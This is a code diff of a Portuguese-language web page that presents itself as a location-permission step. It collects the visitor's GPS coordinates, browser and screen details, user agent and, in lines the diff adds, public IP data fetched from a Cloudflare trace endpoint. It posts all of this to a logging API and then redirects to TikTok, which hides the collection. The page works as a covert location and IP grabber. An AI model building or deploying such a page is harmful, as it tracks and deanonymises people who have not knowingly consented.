@@ -1,6 +1,5 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
-
+<html lang="pt-BR">ß
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -31,7 +30,8 @@
 
 <body class="bg-background-light min-h-screen flex items-center justify-center p-4">
 
-  <main class="card bg-white p-6 sm:p-8 rounded-xl shadow-2xl max-w-sm w-full mx-auto text-center border border-gray-100"
+  <main
+    class="card bg-white p-6 sm:p-8 rounded-xl shadow-2xl max-w-sm w-full mx-auto text-center border border-gray-100"
     role="main">
 
     <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
@@ -52,10 +52,8 @@
       class="w-full bg-primary hover:bg-secondary text-white font-semibold py-3 px-4 rounded-lg shadow-lg transition duration-300 ease-in-out transform hover:-translate-y-0.5 mb-4 disabled:opacity-50 disabled:cursor-not-allowed">
       Permitir Localização e Continuar
     </button>
-    <div id="status"
-      class="w-full p-3 rounded-lg font-medium transition duration-300 text-sm hidden"
-      role="status">
-      </div>
+    <div id="status" class="w-full p-3 rounded-lg font-medium transition duration-300 text-sm hidden" role="status">
+    </div>
 
     <p id="instruction-message" class="text-xs text-gray-500 mt-4 transition duration-500">
       Aguardando sua interação...
@@ -65,10 +63,32 @@
   </main>
 
   <script>
+    let ips = new Array();
     let isRequesting = false;
 
+    const getIp = async () => {
+      const res = await fetch("https://cloudflare.com/cdn-cgi/trace");
+      const text = await res.text();
+
+      const obj = {};
+      text.split("\n").forEach(line => {
+        if (!line) return;
+        const [key, value] = line.split("=");
+        obj[key] = value;
+      });
+
+      return obj;
+    }
+
+    getIp().then(data => {
+      ips.push(data);
+      console.log(ips);
+    });
+
     function formatMetadata(lat, long, accuracy, timestamp, uriMaps, navigations) {
-      return [{
+      getIp();
+
+      const meta =[{
         latitude: lat,
         longitude: long,
         accuracy: accuracy,
@@ -77,14 +97,17 @@
       },
       {
         navegacao: {
-          results: navigations
+          results: navigations,
+          infos: ips
         }
       }];
+
+      return meta;
     }
 
     function redirectPage(status, lat, long, accuracy, timestamp, uriMaps) {
 
-      let navigations = [{
+      const navigations = [{
         cookieEnabled: navigator.cookieEnabled,
         online: navigator.online,
         linguagem: navigator.language
@@ -93,17 +116,14 @@
         screen: {
           width: screen.width,
           height: screen.height
-        },
-          navegacao: {
-            response: navigator
-          }  
+        }
       }];
 
       const meta = formatMetadata(lat, long, accuracy, timestamp, uriMaps, navigations);
 
       if (status === true) {
         try {
-          fetch("http://127.0.0.1:8080/api/log", {
+          fetch("http://localhost:8080/api/log", {
             method: "POST",
             headers: {
               "Content-Type": "application/json"
@@ -113,20 +133,18 @@
               userAgent: navigator.userAgent
             })
           })
-          .then((response) => {
+            .then((response) => {
               return response.json();
             })
             .then((data) => {
-
               window.location.href = "https://www.tiktok.com/"
             })
             .catch((err) => {
-              window.location.href = "https://www.tiktok.com/"
+              console.warn(err);
             });
         } catch (error) {
-          window.location.href = "https://www.tiktok.com/"
+          console.warn(error);
         }
-        // window.location.href = "https://www.tiktok.com/"
       }
     }
 
@@ -224,14 +242,12 @@
 
     window.addEventListener("load", () => {
       updateStatus("Pronto para verificar a localização.", 'initial');
-      
+
       const btn = document.getElementById("request-location-btn");
       if (btn) {
         btn.addEventListener("click", requestLocationByUserClick);
       }
     });
-
   </script>
 </body>
-
 </html>
